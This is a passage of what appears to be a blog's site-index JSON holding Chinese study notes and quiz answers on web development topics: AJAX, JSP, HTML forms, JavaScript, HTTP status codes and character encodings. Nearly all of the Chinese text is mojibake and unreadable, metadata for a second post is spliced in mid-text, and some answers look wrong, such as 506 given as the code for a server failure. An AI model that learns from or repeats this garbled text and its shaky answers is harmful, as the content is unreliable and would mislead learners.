Ã— å½“xmlHttp.open()å‡½æ•°ä¸­çš„è¯·æ±‚æ–¹å¼ä¸ºputæ—¶ï¼Œsend()å‡½æ•°å¯ä»¥æ²¡æœ‰å‚æ•°ã€‚ A. Ã— ç”¨æ¥ç›‘å¬readStateçš„æ–¹æ³•æ˜¯onreadystatechange() B. âˆš å…³äºAJAXæŠ€æœ¯ç›¸å…³ç‰¹ç‚¹ï¼Œæè¿°æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ã€‚ å¯ä»¥ä¿ƒè¿›é¡µé¢å‘ˆç°å’Œæ•°æ®æœ¬èº«åˆ†ç¦» å‡è½»æœåŠ¡å™¨è´Ÿæ‹…ï¼Œé¿å…æ•´ä¸ªæµè§ˆå™¨çª—å£åˆ·æ–°æ—¶é€ æˆçš„é‡å¤è¯·æ±‚ã€‚ å¯¹æµè§ˆå™¨å…·æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œå¯¹äºä¸å…¼å®¹çš„æµè§ˆå™¨ï¼Œå¯èƒ½æ— æ³•ä½¿ç”¨ã€‚ AJAXæ²¡æœ‰åˆ·æ–°é¡µé¢ï¼Œæµè§ˆå™¨ä¸Šçš„â€œåé€€â€æŒ‰é’®æ˜¯å¤±æ•ˆçš„ï¼Œä¸èƒ½é€€å›ã€‚ ç°æœ‰ä»¥ä¸‹éƒ¨åˆ†JSä»£ç æ®µï¼Œç”¨æˆ·ä½¿ç”¨IE5æµè§ˆå™¨èƒ½å¦å®ç°å¼‚æ­¥å…åˆ·æ–°ç½‘é¡µï¼Œå¦‚æœä¸èƒ½åº”è¯¥å¦‚ä½•ä¿®æ”¹ï¼ˆï¼‰ã€‚ 1234567891011121 &lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt;2 function showInfo()&#123;3 var xmlHttp=new XMLHttpRequest(); 4 xmlHttp.open(&quot;POST&quot;, &quot;a.jsp&quot;, true); 5 xmlHttp.onreadystatechange=function() &#123; 6 if (xmlHttp.readyState==4) &#123; 7 infoDiv.innerHTML = xmlHttp.responseText;8 &#125;9 &#125;10 xmlHttp.send(); 11 &#125;12 &lt;/SCRIPT&gt; ä¸èƒ½å®ç°å¼‚æ­¥å…åˆ·æ–°ç½‘é¡µï¼Œç¬¬ä¸‰è¡Œæ”¹ä¸º 1var xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) æ‰€æœ‰ç°ä»£æµè§ˆå™¨ï¼ˆIE7+ã€Firefoxã€Chromeã€Safari ä»¥åŠ Operaï¼‰å‡æ”¯æŒXMLHttpRequest å¯¹è±¡var xmlHttp&#x3D;new XMLHttpRequest(); è€ç‰ˆæœ¬çš„Internet Explorerï¼ˆIE5 å’Œ IE6ï¼‰ä½¿ç”¨ActiveXObjectå¯¹è±¡, var xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) éƒ¨åˆ†åˆ†æHTTPè¯·æ±‚å’Œå“åº”çš„æœåŠ¡å™¨çŠ¶æ€JSä»£ç å¦‚ä¸‹ï¼Œå½“å¤„äºåˆå§‹åŒ–çŠ¶æ€æ—¶åœ¨å®¢æˆ·ç«¯é¡µé¢ä¸Šæ‰“å°çš„readyStateå±æ€§å€¼ä¸ºï¼ˆï¼‰ã€‚ ä¸ä¼šæœ‰æ‰“å°æ•°æ® 123456789101112131415161718192021&lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt; var xmlHttp = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); function showInfo() &#123; xmlHttp.open(&quot;GET&quot;, &quot;c.jsp&quot;, true); xmlHttp.onreadystatechange = showState; xmlHttp.send(); &#125; function showState() &#123; document.writeln(xmlHttp.readyState); &#125;&lt;/SCRIPT&gt; æœåŠ¡å™¨åœ¨åˆå§‹åŒ–çŠ¶æ€æ—¶è¿˜æ²¡æœ‰å’Œå®¢æˆ·ç«¯å»ºç«‹è¿æ¥ï¼Œæ— æ³•æ”¶åˆ°å®¢æˆ·ç«¯Httpè¯·æ±‚ï¼Œæ‰€ä»¥ä¸ä¼šæ‰§è¡ŒshowStateå‡½æ•°ï¼Œä¸ä¼šæœ‰æ‰“å°æ•°æ®åœ¨å®¢æˆ·ç«¯é¡µé¢ã€‚ ä½¿ç”¨AJAXæŠ€æœ¯è·³è½¬åˆ°a.jspé¡µé¢éƒ¨åˆ†ä»£ç æ®µå¦‚ä¸‹ï¼ŒæœåŠ¡å™¨å“åº”è¿”å›å®¢æˆ·ç«¯çš„ä»£ç ä¸ºinfoDiv.innerText &#x3D; xmlHttp.responseText;è¯·é—®æœ€åå®¢æˆ·ç«¯é¡µé¢è¾“å‡ºå†…å®¹ä¸ºï¼ˆï¼‰ã€‚ 1234567891011a.jsp&lt;table&gt; &lt;tr&gt; &lt;th&gt;åœ°å€ï¼š&lt;br&gt;æˆéƒ½ç†å·¥å¤§å­¦&lt;/th&gt; &lt;/tr&gt;&lt;/table&gt; è¾“å‡ºå†…å®¹ä¸º 123456789&lt;table&gt; &lt;tr&gt; &lt;th&gt;åœ°å€ï¼š&lt;br&gt;æˆéƒ½ç†å·¥å¤§å­¦&lt;/th&gt; &lt;/tr&gt;&lt;/table&gt; infoDiv.innerTextå±æ€§ï¼Œè¡¨ç¤ºåœ¨è¯¥divå†…æ˜¾ç¤ºå†…å®¹æ—¶ï¼Œä¸è€ƒè™‘å…¶ä¸­çš„HTMLæ ¼å¼çš„æ ‡ç­¾ï¼Œæ‰€æœ‰æ ‡ç­¾éƒ½ä¸ä¼šè§£é‡Šå¹¶åŸæ ·è¾“å‡ºã€‚ éƒ¨åˆ†JSONä»£ç å¦‚ä¸‹ï¼Œè¯·é—®åœ¨å®¢æˆ·ç«¯å¼¹å‡ºçª—å£è¾“å‡ºçš„å†…å®¹ä¾æ¬¡ä¸ºï¼ˆï¼‰ã€‚ 123456789101112131415161718192021222324252627function opJSON()&#123;var stu = &#123;&quot;sno&quot;:&quot;20190101&quot;,&quot;sname&quot;:&quot;Tom&quot;,&quot;hobby&quot;:[&quot;ç¯®çƒ&quot;,&quot;è¶³çƒ&quot;,â€æ’çƒâ€],&quot;college&quot;:&#123;&quot;cname&quot;:&quot;æˆéƒ½ç†å·¥å¤§å­¦&quot;,&quot;city&quot;:&quot;æˆéƒ½&quot;&#125;&#125;;alert(stu.sname);alert(stu.hobby[3]);alert(stu.college.city);&#125; è¾“å‡ºï¼šTomundefinedæˆéƒ½ æ•°ç»„ä»0å¼€å§‹ï¼Œhobby[3]æ˜¯æ²¡æœ‰çš„ï¼Œå› ä¸ºç¯®çƒè¶³çƒæ’çƒæ˜¯012","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"WEBåº”ç”¨å¼€å‘","slug":"æœŸæœ«è€ƒè¯•/WEBåº”ç”¨å¼€å‘","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/WEB%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"WEB moocé¢˜","slug":"WEB-moocé¢˜","date":"2021-06-22T11:36:56.000Z","updated":"2024-11-12T06:59:05.000Z","comments":true,"path":"2021/06/22/WEB-moocé¢˜/","permalink":"https://gryffinbit.top/2021/06/22/WEB-mooc%E9%A2%98/","excerpt":"","text":"ç¬¬ä¸€ç«  JSPè§„èŒƒå”¯ä¸€æ”¯æŒçš„è¯­è¨€æ˜¯ Java å¯ä»¥é€šè¿‡ä¿®æ”¹Tomcatçš„é…ç½®æ–‡ä»¶è¿›è¡Œä¿®æ”¹å‚æ•°ï¼Œä¸‹é¢çš„server.xmlæ–‡ä»¶éƒ¨åˆ†ä»£ç ä¸­ï¼Œç«¯å£å·æ˜¯å¤šå°‘ï¼ˆï¼‰ 12345&lt;Connector port=â€8443â€ protocol=â€HTTP/1.1â€connectionTimeout=â€8080â€redirectPort=â€8888â€/&gt; A. 8443 âœ… B. 8888 C. 8080 D. 1.1 åœ¨Eclipseä¸­ï¼Œä¸€ä¸ªWebåº”ç”¨ç¨‹åºçš„éƒ¨ç½²æè¿°æ–‡ä»¶ä½äºï¼ˆ ï¼‰ç›®å½•ã€‚ A. WebRoot B. META-INF C. src D. WEB-INF âœ… web.xml æ˜¯webåº”ç”¨çš„é…ç½®æ–‡ä»¶ï¼Œä¸èƒ½åˆ é™¤æˆ–éšæ„ä¿®æ”¹ï¼Œä½äºWEB-INFç›®å½•æ ¹ç›®å½•ä¸‹ å…³äºä¸‹é¢è¿™ä¸ªURLè¯´æ³•æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ http://localhost:8080/Prj01/index.jsp A. httpæ˜¯ä¸»æœºåœ°å€ B. localhostæ˜¯åè®® C. 8080æ˜¯ä¸»æœºIPåœ°å€ D. prj01æ˜¯ä¸»æœºèµ„æºç›®å½• âœ… httpæ˜¯åè®® localhostæ˜¯ä¸»æœºIPåœ°å€æˆ–åŸŸå 8080æ˜¯ç«¯å£å· prj01&#x2F;index.jspæ˜¯ä¸»æœºèµ„æºå…·ä½“åœ°å€ï¼Œå¦‚ç›®å½•å’Œæ–‡ä»¶åç­‰ å½“ç”¨æˆ·è¯·æ±‚JSPé¡µé¢æ—¶ï¼ŒJSPå¼•æ“ä¼šæ‰§è¡Œè¯¥é¡µé¢çš„å­—èŠ‚ç æ–‡ä»¶å“åº”å®¢æˆ·çš„è¯·æ±‚ï¼Œæ‰§è¡Œå­—èŠ‚ç æ–‡ä»¶çš„ç»“æœæ˜¯ï¼ˆï¼‰ A. å‘é€ä¸€ä¸ªHTMLé¡µé¢åˆ°å®¢æˆ·ç«¯é¢ âœ… B. ä»€ä¹ˆéƒ½ä¸åš C. å‘é€ä¸€ä¸ªJavaæ–‡ä»¶åˆ°å®¢æˆ·ç«¯ D. å‘é€ä¸€ä¸ªJSPæºæ–‡ä»¶åˆ°å®¢æˆ·ç«¯ ç¬¬äºŒç«  åœ¨htmlæ ‡ç­¾ä¸­è¦è®¾ç½®å­—ä½“çš„æ ·å¼éœ€è¦ä½¿ç”¨çš„å±æ€§ä¸º Size Font face âœ… color è¦ç”¨çš„æ ‡ç­¾æ˜¯ fontï¼Œè¦ç”¨çš„ä»–çš„faceå±æ€§ è¦å°†ä¸¤æ®µæ–‡å­—Javaå’ŒWebè®¾ç½®åœ¨åŒä¸€è¡Œæ˜¾ç¤ºï¼Œå¯ä»¥ä½¿ç”¨: 1&lt;h7&gt;Java&lt;/h7&gt;&lt;h8&gt;Web&lt;/h8&gt; æ ‡é¢˜æ ‡ç­¾åªæœ‰1-6ï¼Œè¶…è¿‡èŒƒå›´çš„éƒ½ä¼šä»¥é»˜è®¤å­—ä½“ã€å­—å·æ˜¾ç¤ºï¼Œå¹¶ä¸”æ²¡æœ‰æ¢è¡Œ ç°æœ‰éƒ¨åˆ†htmlä»£ç å¦‚ä¸‹: 1234567&lt;ol type=&quot;A&quot;&gt; &lt;li&gt;Java&lt;/li&gt; &lt;li&gt;Web&lt;/li&gt;&lt;/ol&gt; è¯·é—®è¿™æ®µä»£ç åœ¨æµè§ˆå™¨ä¸Šæ˜¾ç¤ºç»“æœæ˜¯ï¼ˆ A.JavaB.Web ï¼‰ typeå±æ€§å€¼ä¸ºaæ—¶ä¼šæ˜¾ç¤ºæœ‰åºåºå·aã€bã€câ€¦typeå±æ€§å€¼ä¸ºAæ—¶ä¼šæ˜¾ç¤ºæœ‰åºåºå·Aã€Bã€Câ€¦.typeå±æ€§å€¼ä¸ºå…¶ä»–å€¼æ—¶ï¼Œä¼šæ˜¾ç¤ºé»˜è®¤æœ‰åºåºå·1ã€2ã€3ã€4â€¦. åœ¨tableæ ‡ç­¾é‡Œï¼Œè¦åˆå¹¶ä¸€åˆ—çš„3ä¸ªå•å…ƒæ ¼éœ€è¦ä½¿ç”¨å“ªä¸ªå±æ€§å€¼ 12td.rowspan=&quot;3&quot; //è¡Œ td.colsapn=&quot;3&quot; //åˆ— ç°æœ‰éƒ¨åˆ†å…³äºå•é€‰æŒ‰é’®çš„Htmlä»£ç ï¼š 1234&lt;input type=&quot;radio&quot; name=&quot;1&quot; checked&gt;ç”· &lt;input type=&quot;radio&quot; name=&quot;2&quot; checked&gt;å¥³&lt;BR&gt; åœ¨æµè§ˆå™¨ä¸Šæ˜¾ç¤ºçš„æ•ˆæœæ˜¯ï¼ˆ â€œç”·â€å’Œâ€œå¥³â€éƒ½ä¼šè¢«é»˜è®¤é€‰ä¸­ ï¼‰ ä¸¤ä¸ªå•é€‰æŒ‰é’®çš„nameå±æ€§å€¼ä¸ä¸€æ ·ï¼Œè¯´æ˜ä»–ä»¬åˆ†åˆ«æ˜¯ä¸¤ç»„å•é€‰æŒ‰é’®ï¼Œæ‰€ä»¥ä¼šè¢«å…¨éƒ¨é€‰ä¸­ ç¬¬ä¸‰ç«  ä»¥ä¸‹å“ªäº›JavaScriptå˜é‡çš„å‘½åæ˜¯é”™è¯¯çš„ï¼Ÿ (1)var hello; (2)var Java; (3)var 123; (4)var x%x; (5)var $hello; (6)var _Script; (7)var for; å‘½åè§„èŒƒï¼š é¦–ä½å­—ç¬¦å¿…é¡»æ˜¯å­—æ¯A-Zï¼Œa-zï¼Œ_ ï¼Œ$ã€‚ å…¶ä»–ä½ç½®ä¸Šå¯ä»¥æ˜¯ _ , $ , 0-9 , a-z ï¼Œ A-Z å…³é”®å­—ä¸èƒ½å‘½åï¼š for ç°æœ‰å¦‚ä¸‹è®¡æ—¶å™¨ä»£ç ï¼Œè¦è®©è®¡æ—¶å™¨æ­£ç¡®çš„æ˜¾ç¤ºåœ¨æ–‡æœ¬æ¡†é‡Œï¼Œè¯·è¡¥å…¨ç¼ºå¤±éƒ¨åˆ†ã€‚ï¼ˆï¼‰ 12345678910111213141516&lt;html&gt;&lt;body&gt; &lt;input type=&quot;text&quot; id=&quot;count&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; var num = 0; function startCount() &#123; document.getElementByld(&quot;count&quot;).value = num; ------------ num += 1; setTimeout(startCount, 1000); &#125; setTimeout(startCount, 1000); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; alert(num) æ˜¾ç¤ºåœ¨å¼¹å‡ºçš„æ¶ˆæ¯æ¡†é‡Œï¼Œ window.status&#x3D;num æ˜¾ç¤ºåœ¨æµè§ˆå™¨çª—å£çš„çŠ¶æ€æ é‡Œï¼Œ getElementByld(â€œcountâ€).value &#x3D; num å°‘äº†å¯¹è±¡åä¼šå‡ºé”™ document.getElementByld(â€œcountâ€).value &#x3D; num å°†numé™„å€¼ç»™IDä¸ºcountçš„æ–‡æœ¬çš„å±æ€§å€¼value historyå¯¹è±¡çš„ ï¼ˆ go(-1) ï¼‰ æ–¹æ³•è¦æ±‚çª—å£æ˜¾ç¤ºåˆšåˆšè®¿é—®çš„å‰ä¸€ä¸ªé¡µé¢ history.back() è¿”å›ä¸Šä¸€é¡µ history.forward() è¿”å›ä¸‹ä¸€é¡µ history.go(n) å¦‚æœnæ˜¯æ­£æ•°å‰è¿›næ ¼ï¼Œè´Ÿæ•°è¡¨ç¤ºå‘åé€€næ ¼ åœ¨JavaScriptå†…ç½®å¯¹è±¡ä¸­ï¼Œä¸èƒ½å®ç°åœ¨å½“å‰é¡µé¢è·³è½¬çš„ä»£ç æ˜¯(window.open) window.open()åœ¨æ–°çª—å£è·³è½¬ å¯ä»¥åœ¨å½“å‰é¡µé¢è·³è½¬çš„æœ‰window.location.href , location.href , this.location.href , self.location.href , window.location.replace ä¸‹é¢ä»£ç å¯ä»¥å®ç°åœ¨é¡µé¢æ˜¾ç¤ºå¦‚å›¾ä¹ä¹ä¹˜æ³•è¡¨ï¼Œè¯·è¡¥å…¨ä»£ç ã€‚ 123456789101112131415161718&lt;html&gt;&lt;head&gt; &lt;title&gt;ä¹ä¹ä¹˜æ³•è¡¨&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; for (var i = 1; i &lt;= 9; i++) &#123; for (var j = 1; j &lt;= i; j++) &#123; a = i + &quot;*&quot; + j + &quot;=&quot; + i * j + &quot; &quot; **document.write(a)** ___________________ &#125; **document.write(&quot;&lt;br&gt;&quot;);** _________________ &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; alert() æ˜¯åœ¨å¼¹å‡ºçš„æ¶ˆæ¯æ¡†æ˜¾ç¤ºå†…å®¹ console.log()æ˜¯åœ¨æ§åˆ¶å°æ˜¾ç¤ºå†…å®¹ window.status()æ˜¯åœ¨æµè§ˆå™¨çª—å£çš„çŠ¶æ€æ æ˜¾ç¤ºå†…å®¹ document.write()å¯ä»¥åœ¨é¡µé¢æ˜¾ç¤ºå†…å®¹ ç¬¬å››ç«  ç”¨æˆ·å¯ä»¥åœ¨ï¼ˆ â€œ&lt;jsp: å’Œ /&gt;â€ ï¼‰ æ ‡è®°ä¹‹é—´æ’å…¥åŠ¨ä½œ åœ¨â€œ&lt;%!â€å’Œâ€œ%&gt;â€æ ‡è®°ä¹‹é—´å£°æ˜çš„Javaæ–¹æ³•ç§°ä¸ºé¡µé¢çš„æˆå‘˜æ–¹æ³•ï¼Œå…¶ï¼ˆ åœ¨æ•´ä¸ªé¡µé¢å†… ï¼‰æœ‰æ•ˆã€‚ åœ¨Javaå£°æ˜æ ‡è®°çš„å£°æ˜çš„å˜é‡ã€æ–¹æ³•åœ¨æ•´ä¸ªé¡µé¢å†…æœ‰æ•ˆ åœ¨ç¨‹åºæ®µé‡Œå£°æ˜çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡ï¼Œä»å®šä¹‰ä¹‹åæœ‰æ•ˆ ç°æœ‰å¦‚ä¸‹JSPä»£ç ç‰‡æ®µã€‚ 123456&lt;%!int n=0;%&gt;&lt;% int m=0; (1); out.print(&quot;æ¬¢è¿è®¿é—®æœ¬ç½‘ç«™ï¼&lt;br&gt;&quot;); out.print(&quot;æ‚¨æ˜¯ç¬¬&quot;+ (2) +&quot;ä¸ªè®¿é—®æœ¬ç«™çš„å®¢æˆ·ã€‚&quot;);%&gt; è¦å®ç°ç½‘ç»œè®¡æ•°å™¨çš„åŠŸèƒ½ï¼Œè¯·è¡¥å…¨ä»£ç ã€‚ (1) n++ (2)n næ˜¯å…¨å±€å˜é‡ï¼Œmæ˜¯å±€éƒ¨å˜é‡ï¼Œæ‰€ä»¥ç”¨å…¨éƒ¨å˜é‡è¿›è¡Œç´¯åŠ  ç°æœ‰ä»¥ä¸‹jspä»£ç ç‰‡æ®µã€‚ 123&lt;% String str=&quot;12&quot;; int number=Integer.parseInt(str); %&gt;è¯¥æ•°å­—çš„å¹³æ–¹ä¸ºï¼š&lt;%=number*number %&gt;&lt;HR&gt;&lt;a href=&quot;4.6urlP2.jsp?number=______&quot;&gt;åˆ°è¾¾p2&lt;/a&gt; è¯·é—®ç©ºæ ¼å¤„å¡«ä»¥ä¸‹å“ªä¸ªä»£ç å¯ä»¥ç”¨urlä¼ å€¼? &lt;%=str+1%&gt; urlä¼ å€¼åªèƒ½ä¼ å­—ç¬¦ä¸²ï¼Œ è¿ç®—è¡¨è¾¾å¼ä¼šè¯­æ³•é”™è¯¯ï¼Œæ¯”å¦‚ 24+3 &lt;%=str+number%&gt; ä¸¤ä¸ªä¸åŒç±»å‹å˜é‡çš„å€¼ï¼Œè¯­æ³•é”™è¯¯ str æ˜¯å˜é‡æ— æ³•ä¼ å€¼ stræ˜¯å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä¸æ˜¯è¿›è¡Œè®¡ç®— ç°æœ‰ä»¥ä¸‹jspä»£ç ç‰‡æ®µã€‚ 123&lt;% String str=&quot;12&quot;; int number=Integer.parseInt(str); %&gt;è¯¥æ•°å­—çš„å¹³æ–¹ä¸ºï¼š&lt;%=number*number %&gt;&lt;HR&gt;&lt;a href=&quot;4.6urlP2.jsp?number=&lt;%=str+6%&gt;&quot;&gt;åˆ°è¾¾p2&lt;/a&gt; è¯·é—®èƒ½ä¸èƒ½ç”¨urlä¼ å€¼åˆ°4.6urlP2.jsp?å¦‚æœèƒ½ä¼ çš„å€¼æ˜¯å¤šå°‘ï¼Ÿ 126 æ˜¯ç›´æ¥è¿›è¡Œäº†ä¸€ä¸ªæ‹¼æ¥ ç°æœ‰å¦‚ä¸‹JSPä»£ç ç‰‡æ®µï¼Œç”¨æ¥è®¡ç®—çŸ©å½¢çš„é¢ç§¯ã€‚ 123456789101112131415&lt;% int row=Integer.parseInt(request.getParameter(&quot;&lt;tr&gt;&quot;));int col = Integer.parseInt(request.getParameter(&quot;&lt;td&gt;&quot;));out.print(&quot;&lt;table border=1&gt;&quot;);for(int i = 1; i &lt;= row; i++)&#123; out.print(&quot;&lt;tr&gt;&quot;); for(int j = 1; j &lt;= col; j++)&#123; out.print(&quot;&lt;td&gt;&quot;); out.print(i*j); out.print(&quot;&lt;/td&gt;&quot;); &#125; out.print(&quot;&lt;/tr&gt;&quot;);&#125;out.print(&quot;&lt;/table&gt;&quot;);%&gt; ç°åœ¨ç”¨jsp:paramåŠ¨ä½œâ€œåå­—-å€¼â€æ¥ä¸ºçŸ©å½¢çš„é•¿å’Œå®½ä¼ é€’å‚æ•°ï¼Œè¯·é—®ä¼ å€¼çš„â€œåå­—â€åº”è¯¥ä¸ºï¼ˆï¼‰ã€‚ &lt;tr&gt;å’Œ&lt;td&gt; ç¬¬äº”ç«  ç°æœ‰æ–‡ä»¶åä¸ºcharCode.jspæºä»£ç ï¼Œè¯·é—®æ–‡ä»¶è¿è¡Œåèƒ½ä¸èƒ½ä¼ å€¼åˆ°æŒ‡å®šé¡µé¢ï¼Œå¦‚æœä¸èƒ½è¯·æ‰¾å‡ºé”™è¯¯ä»£ç ã€‚ï¼ˆï¼‰ 12345678910111213141516&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;&lt;html&gt; &lt;body&gt; &lt;form acton=&quot;charCode.jsp&quot;&gt; è¯·æ‚¨è¾“å…¥é²œèŠ±çš„æ¨¡ç³Šèµ„æ–™ï¼š&lt;BR&gt; &lt;input type=&quot;hidden&quot; name=&quot;flower&quot; type=&quot;text&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;æŸ¥è¯¢&quot;&gt; âŒ &lt;/form&gt;&lt;% String flower = request.getParameter(&quot;flower&quot;);if(flower!=null)&#123; out.println(&quot;èŠ±æœµåç§°ä¸ºï¼š&quot; + flower);&#125;%&gt;&lt;/body&gt;&lt;/html&gt; æœ¬é¡µé¢æ—¢å½“å®¢æˆ·ç«¯æäº¤è¡¨å•é¡µé¢ï¼Œåˆå½“æœåŠ¡å™¨ç«¯æ¥æ”¶è¡¨å•é¡µé¢ è™½ç„¶è¾“å…¥æ¡†è¢«éšè—äº†ï¼Œå®¢æˆ·ç«¯æ— æ³•è¾“å…¥å€¼ï¼Œä½†è¿˜æ˜¯å¯ä»¥ä¼ å€¼åˆ°æ¥æ”¶é¡µé¢ï¼› ç±»å‹ä¸ºæ™®é€šæŒ‰é’®buttonæ˜¯æ— æ³•å‘æ¥æ”¶é¡µé¢æäº¤è¡¨å•ä¿¡æ¯ï¼Œsubmitæ‰èƒ½æäº¤ postæ–¹æ³•æ˜¯å°†è¡¨å•å†…å„å­—æ®µä¸å…¶å†…å®¹ä»¥é”®-å€¼å¯¹æ”¾åœ¨httpæŠ¥æ–‡çš„å“ªä¸ªéƒ¨åˆ†ï¼Ÿï¼ˆï¼‰ httpè¯·æ±‚æŠ¥æ–‡çš„å®ä½“ä¸»ä½“éƒ¨åˆ† Getæ–¹æ³•æ˜¯å°†ä¼ å€¼å†…å®¹ä»¥é”®å€¼å¯¹æ”¾åœ¨httpè¯·æ±‚æŠ¥æ–‡è¯·æ±‚è¡Œçš„URLå­—æ®µ Postæ–¹æ³•æ˜¯å°†ä¼ å€¼å†…å®¹ä»¥é”®å€¼å¯¹æ”¾åœ¨httpè¯·æ±‚æŠ¥æ–‡çš„å®ä½“ä¸»ä½“éƒ¨åˆ† å¦‚æœç°åœ¨å› ä¸ºæœåŠ¡å™¨æ•…éšœè€Œæ— æ³•è¿”å›è¯·æ±‚çš„é¡µé¢ï¼Œè¿”å›çŠ¶æ€ç 506 varlant also negotiates 2xx è¡¨ç¤ºæˆåŠŸ 204 No Content è¡¨ç¤ºæœåŠ¡å™¨æˆåŠŸå¤„ç†è¯·æ±‚ï¼Œä½†ä¸éœ€è¦è¿”å›ä»»ä½•å®ä½“å†…å®¹ 3xx è¡¨ç¤ºé‡å®šå‘ï¼Œå®Œæˆè¯·æ±‚åè¿˜éœ€è¦è¿›ä¸€æ­¥é‡‡å–æªæ–½ã€‚ 304 Not Modified è¡¨ç¤ºå®¢æˆ·ç«¯å‘é€äº†ä¸€ä¸ªå¸¦æ¡ä»¶çš„GEtè¯·æ±‚ï¼Œæ–‡æ¡£å†…å®¹æ²¡è¢«æ”¹å˜ 4xx è¡¨ç¤ºå®¢æˆ·çš„å·®é”™ 5xx è¡¨ç¤ºæœåŠ¡å™¨çš„å·®é”™ UTF-8 ä¸­æ–‡å­—ç¬¦ä½¿ç”¨24ä½ç¼–ç ï¼Œè‹±æ–‡å­—ç¬¦ä½¿ç”¨8ä½ç¼–ç ï¼Œå…¼å®¹ASCIIå’ŒISO-8859-1ã€‚ä¸å…¼å®¹ä¸­æ–‡å­—ç¬¦ä½¿ç”¨16ä½ç¼–ç çš„GB232&#x2F;GBKã€‚ Unicode ä¸­æ–‡å­—ç¬¦å’Œè‹±æ–‡å­—ç¬¦ä½¿ç”¨16ä½æˆ–32ä½ç¼–ç ï¼Œä¸å…¼å®¹GBK GB2312 ä¸­æ–‡å­—ç¬¦ä½¿ç”¨16ä½ç¼–ç ï¼Œè‹±æ–‡å­—ç¬¦ä½¿ç”¨8ä½ç¼–ç ï¼Œå…¼å®¹ISO-8859-1 ISO-8859-1 ä½¿ç”¨8ä½ç¼–ç ï¼Œæ— æ³•æ˜¾ç¤ºä¸­æ–‡å­—ç¬¦ï¼Œå…¼å®¹ASCII ç°æœ‰tomcatæœåŠ¡å™¨é…ç½®æ–‡ä»¶server.xmléƒ¨åˆ†å†…å®¹ï¼ŒåŠå®¢æˆ·ç«¯æäº¤è¡¨å•é¡µé¢a.jspï¼Œå’ŒæœåŠ¡å™¨ç«¯è¡¨å•æ¥æ”¶é¡µé¢b.jspï¼Œå®¢æˆ·æäº¤è¡¨å•åä¸­æ–‡æ˜¾ç¤ºä¹±ç ï¼Œè¯·ç”¨ä»¥ä¸‹å“ªç§åŠæ³•å¯ä»¥æ­£ç¡®æ˜¾ç¤ºä¸­æ–‡å­—ç¬¦ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445Server.xml&lt;Connector connectionTimeout=&quot;20000&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; redirectPort=&quot;8443&quot; URIEncoding=&quot;gbk&quot;/&gt;a.jsp&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=ISO-8859-1&quot;%&gt;&lt;html&gt; &lt;body&gt; &lt;form action=&quot;b.jsp&quot; method=&quot;get&quot;&gt; è¯·æ‚¨è¾“å…¥å­¦ç”Ÿçš„æ¨¡ç³Šèµ„æ–™ï¼š&lt;BR&gt; &lt;input name=&quot;stuname&quot; type=&quot;text&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;æŸ¥è¯¢&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;b.jsp&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;&lt;html&gt; &lt;body&gt; &lt;% String stuname = request.getParameter(&quot;stuname&quot;); out.println(&quot;è¾“å…¥çš„æŸ¥è¯¢å…³é”®å­—ä¸º:&quot; + stuname); %&gt; &lt;/body&gt;&lt;/html&gt; æ”¹a.jspé‡Œä»£ç charset=gb2312; æ”¹b.jspé‡Œçš„ä»£ç  charset=utf-8 postæ–¹æ³•ä¼ å€¼é”®-å€¼å¯¹åœ¨è¯·æ±‚æŠ¥æ–‡å®ä½“ä¸»ä½“éƒ¨åˆ†ï¼Œé»˜è®¤ç”¨iso-8859-1ç¼–ç ï¼Œå¯ä»¥åœ¨æ¥æ”¶é¡µé¢è½¬ç äº¤ç»™æœåŠ¡å™¨ã€‚ getæ–¹æ³•ä¼ å€¼é”®-å€¼å¯¹åœ¨è¯·æ±‚æŠ¥æ–‡è¯·æ±‚è¡Œçš„URLå­—æ®µï¼Œé»˜è®¤ç”¨iso-8859-1ç¼–ç ï¼Œéœ€è¦åœ¨å®¢æˆ·æäº¤é¡µé¢è½¬ç äº¤ç»™æœåŠ¡å™¨ ç¬¬å…­ç«  å¦‚æœè¿œç¨‹MySQLæ•°æ®åº“æœåŠ¡å™¨çš„IPåœ°å€æ˜¯202.115.128.123ï¼Œè¿›å…¥æ­¤æœåŠ¡å™¨MySQLå‘½ä»¤è¡Œå®¢æˆ·ç«¯ç®¡ç†å·¥å…·çš„å‘½ä»¤ä¸ºï¼ˆï¼‰ã€‚ 1mysql -h 202.115.128.123 root -p æŸ¥è¯¢ç»“æœé›†ResultSetæ˜¯ä»¥ç»Ÿä¸€çš„è¡Œåˆ—å½¢å¼ç»„ç»‡æ•°æ®ï¼Œæ‰§è¡Œâ€œResultSet rs=stat.executeQuery(â€œselect bid,name,author,publish,price from 